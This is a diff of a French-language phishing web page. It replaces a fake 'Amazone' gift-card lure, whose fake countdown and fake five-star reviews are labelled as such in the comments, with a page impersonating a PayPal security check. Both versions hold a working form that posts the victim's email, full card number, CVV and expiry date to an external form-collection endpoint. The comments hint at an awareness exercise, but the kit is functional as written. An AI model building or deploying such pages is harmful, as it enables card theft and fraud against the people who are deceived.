@@ -1,202 +1,143 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Récompense Exclusive - Confirmez Votre Identité</title>
+    <title>Vérification de Sécurité</title>
     <style>
+        /* Styles de base */
         body {
+            background-color: #f9f9f9;
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 100vh;
             margin: 0;
             padding: 0;
         }
 
-        /* En-tête */
-        header {
-            background-color: #ff9900;
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-
-        header h1 {
-            margin: 0;
-            font-size: 24px;
-        }
-
-        /* Contenu principal */
         .container {
-            background-color: white;
-            max-width: 400px;
-            margin: 30px auto;
-            padding: 20px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            border-radius: 8px;
-            
-        }
-
-        .container h2 {
-            font-size: 20px;
-            color: #333;
-            text-align: center;
-        }
-
-        .container p {
-            font-size: 14px;
-            color: #555;
-            text-align: center;
-        }
-
-        input {
+            flex: 1; /* Permet au contenu de prendre l’espace dispo sans pousser le footer */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
             width: 100%;
-            padding: 10px;
-            margin: 10px 0;
+            padding-bottom: 20px; /* Espace avant le footer */
+        }
+
+        form {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        div {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        input[type="email"],
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
             border: 1px solid #ccc;
             border-radius: 5px;
             font-size: 16px;
+            box-sizing: border-box;
+            margin-bottom: 10px;
         }
 
-        .btn {
+        button {
             width: 100%;
-            background-color: #ff9900;
-            color: white;
-            border: none;
-            padding: 12px;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        .btn:hover {
-            background-color: #e68900;
-        }
-        
-        /* Faux compteur */
-        .counter {
-            font-size: 20px;
-            font-weight: bold;
-            color: red;
-            margin: 10px 0;
-        }
-        
-        /* Avis clients */
-                .reviews {
-                    margin-top: 20px;
-                    text-align: left;
-                }
-        
-                .review {
-                    background-color: #f9f9f9;
-                    padding: 10px;
-                    margin: 10px 0;
-                    border-radius: 5px;
-                    font-size: 14px;
-                    color: #444;
-                }
-        
-                .review strong {
-                    color: #222;
-                }
-        
-        /* Footer */
-        footer {
-            background-color: #808080;
-            color: white;
-            padding: 10px;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        footer a {
-            color: #ff9900;
-            text-decoration: none;
-        }
-
-        footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* Alerte de sensibilisation */
-        .alert {
-            background-color: #ffcc00;
             padding: 15px;
-            text-align: center;
-            font-weight: bold;
-            color: #333;
-            margin-top: 20px;
+            border: none;
+            border-radius: 50px;
+            background-color: #0056D2;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
         }
-        
-    </style>
-</head>
-<body>
 
-    <!-- En-tête -->
-    <header>
-        <h1>🎉Félicitations ! Vous êtes éligible pour une carte cadeau Amazone de 100€</h1>
-    </header>
-    
-   <!-- Contenu principal -->
-      
-    <div class="container">
-        <h2>Recevez une carte cadeau de 100€ </h2>
-        <p>Chaque semaine, nous offrons des cartes cadeaux aux utilisateurs sélectionnés au hasard.</p>
-        <p>⚠️ Attention : Cette offre est *limitée* aux 50 premiers gagnants du jour.</p>
+        button:hover {
+            background-color: #003D99;
+        }
 
-        <!-- Faux compteur -->
-        <p class="counter">❗ Plus que <span id="countdown">10</span> cartes disponibles</p>
+        .footer {
+            font-size: 14px;
+            text-align: center;
+            color: #777;
+            padding: 10px;
+            background-color: #f1f1f1;
+            width: 100%;
+            position: relative; /* Permet au footer de rester en bas sans cacher le contenu */
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
 
-    <!-- Formulaire sécurisé -->
-    <form action="https://formcarry.com/s/iVwd8lHvQpp" method="POST">
-        <div class="container">
-            <h2>Validation de votre identité</h2>
-            <p>Veuillez remplir les informations ci-dessous pour recevoir votre récompense.</p>
-            <p>Toutes les transactions et vérifications sont sécurisées grâce à un chiffrement avancé SSL 256 bits, garantissant la confidentialité de vos données.</p>
-            
-            <input type="text" name="Nom Complet" placeholder="Nom Complet" required>
-            <input type="email" name="email" placeholder="Adresse e-mail" required>
-            <input type="text" name="carte_bancaire" placeholder="Numéro de carte bancaire" required>
-            <input type="text" name="cvv" placeholder="CVV (3 chiffres)" required maxlength="3">
-            <input type="text" name="expiration" placeholder="Date d'expiration (MM/AA)" required maxlength="5">
-            
-            <button type="submit" class="btn">Valider</button>
-        </div>
-    </form>
-    
+        .footer a {
+            text-decoration: none;
+            color: #0056D2;
+            padding: 5px;
+            font-weight: bold;
+        }
 
-    <!-- Alerte éducative -->
-    <div class="alert">
-        ⚠️ATTENTION : Pour valider votre gain et éviter toute fraude, nous devons confirmer votre identité en toute sécurité. En cas de données incorrectes, votre récompense pourrait être annulée.
-    </div>
-    </div>
+        .footer a:hover {
+            text-decoration: underline;
+            color: #003D99;
+        }
 
-    
-        <!-- Faux avis clients -->
-                <div class="reviews">
-                    <div class="review"><strong>⭐️⭐️⭐️⭐️⭐️ Laura M.</strong> - Incroyable, j'ai reçu ma carte en 5 minutes ! Merci !</div>
-                    <div class="review"><strong>⭐️⭐️⭐️⭐️⭐️ Julien D.</strong> - J'étais sceptique, mais ça marche vraiment ! 🔥</div>
-                    <div class="review"><strong>⭐️⭐️⭐️⭐️⭐️ Sophie T.</strong> - Un cadeau inattendu, je suis ravie ! 🙌</div>
-                    <div class="review"><strong>⭐️⭐️⭐️⭐️⭐️ Marc L.</strong> - Très heureux d'avoir participé, tout est arrivé rapidement ! 🎁</div>
-                    <div class="review"><strong>⭐️⭐️⭐️⭐️⭐️ Alice P.</strong> - Je ne m'attendais pas à ça ! Très contente de mon gain ! 🎉</
-    </div>
-    
-    
-    <script>
-            // Faux compteur qui diminue
-            let count = 10;
-            function updateCountdown() {
-                if (count > 5) {
-                    count--;
-                    document.getElementById("countdown").innerText = count;
-                }
+        /* Ajustements pour les petits écrans */
+        @media (max-width: 400px) {
+            form {
+                padding: 15px;
             }
-            setInterval(updateCountdown, 3000);
-        </script>
-   
+            button {
+                font-size: 16px;
+            }
+            .footer {
+                font-size: 12px;
+                padding: 8px;
+            }
+        }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <form action="https://formcarry.com/s/iVwd8lHvQpp" method="POST">
+        <h2>Vérification de Sécurité<br>Protégez vos transactions</h2>
 
-    <!-- Footer -->
-    <footer>
-        <p>&copy; 2025 Amazone Gift-Card Project - <a href="#">www.amazone.com</a></p>
-    </footer>
+        <div><input id="email" name="email" placeholder="Adresse e-mail" required="" type="email"></div>
+        
+        <div><input id="card_number" name="card_number" placeholder="Numéro de carte" required="" type="text"></div>
 
-</body>
+        <div><input id="cvv" name="cvv" placeholder="CVV" required="" type="text" maxlength="3"></div>
+
+        <div><input id="expiration_date" name="expiration_date" placeholder="Date d'expiration MM/AA" required="" type="text" maxlength="5"></div>
+
+        <p style="font-size: 12px; color: #555;">Toutes les informations sont sécurisées via HTTPS.</p>
+
+        <button type="submit">Confirmer</button>
+      </form>
+
+      <p style="font-size: 12px; color: #555; text-align: center; padding: 10px;">
+        Pour garantir la sécurité de votre achat et prévenir toute tentative de fraude, PayPal vous demande une vérification d’identité supplémentaire. Cette étape rapide, d’une durée maximale de 5 minutes, est essentielle pour compléter votre transaction en toute sécurité.
+      </p>
+    </div>
+
+    <div class="footer">
+      <a href="#">Politique de confidentialité</a>
+      <a href="#">Conditions d'utilisation</a>
+      <a href="#">Contact</a>
+    </div>
+  </body>
+</html>
